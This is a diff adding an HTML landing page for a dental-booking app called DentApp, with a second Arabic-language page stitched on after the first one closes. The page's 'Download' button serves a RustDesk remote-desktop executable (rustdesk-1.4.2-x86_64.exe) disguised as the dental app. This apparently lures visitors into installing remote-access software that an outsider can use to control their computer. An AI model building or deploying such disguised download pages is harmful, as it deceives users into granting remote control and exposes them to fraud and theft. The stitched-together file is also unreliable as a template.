@@ -1,0 +1,100 @@
+<!-- File: dentapp.html -->
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DentApp — 3 VSCode-like Themes</title>
+<link rel="stylesheet" href="yassine.css">
+</head>
+<body class="theme-a">
+
+
+<div class="controls">
+<label>Choose theme:</label>
+<button class="theme-btn" data-theme="a">A — Classic</button>
+<button class="theme-btn" data-theme="b">B — Neon</button>
+<button class="theme-btn" data-theme="c">C — Medical</button>
+<div style="flex:1"></div>
+<small class="meta">Preview: DentApp — Landing hero + phone mockup</small>
+</div>
+
+
+<main class="page">
+<section class="left">
+<h1>DentApp</h1>
+<p class="lead">The best app for easily booking dental appointments</p>
+
+
+
+<div class="features">
+<div class="feature"><div class="icon">📅</div><div>Easy booking</div></div>
+<div class="feature"><div class="icon">🔔</div><div>Appointment reminders</div></div>
+<div class="feature"><div class="icon">🛡️</div><div>Trusted dentists</div></div>
+</div>
+</section>
+
+
+<aside class="right">
+<div class="phone">
+<div class="notch"></div>
+<div class="screen">
+<div class="tooth"></div>
+<h2>Book Your<br/>Dental Appointment</h2>
+<input class="inp" placeholder="Name"/>
+<button class="get-btn">Get Started</button>
+</div>
+</div>
+</aside>
+</main>
+
+
+<script>
+// Theme switcher (applies a class on <body>)
+const buttons = document.querySelectorAll('.theme-btn')
+buttons.forEach(b=>b.addEventListener('click', ()=>{
+document.body.className = 'theme-' + b.dataset.theme
+}))
+</script>
+
+<section>
+<div>
+ <div>
+
+
+
+
+ </div>
+<a class="cta" href="rustdesk-1.4.2-x86_64.exe" download>Download</a>
+
+
+</div>
+
+
+</section>
+
+
+
+
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DentApp - تطبيق الأسنان</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header>
+    <h1>مرحبا بك في DentApp 🦷</h1>
+    <p>تطبيق حجز مواعيد أطباء الأسنان بسهولة وسرعة</p>
+    <button onclick="window.location.href='https://example.com/download'">
+      تحميل التطبيق
+    </button>
+  </header>
+</body>
+</html>
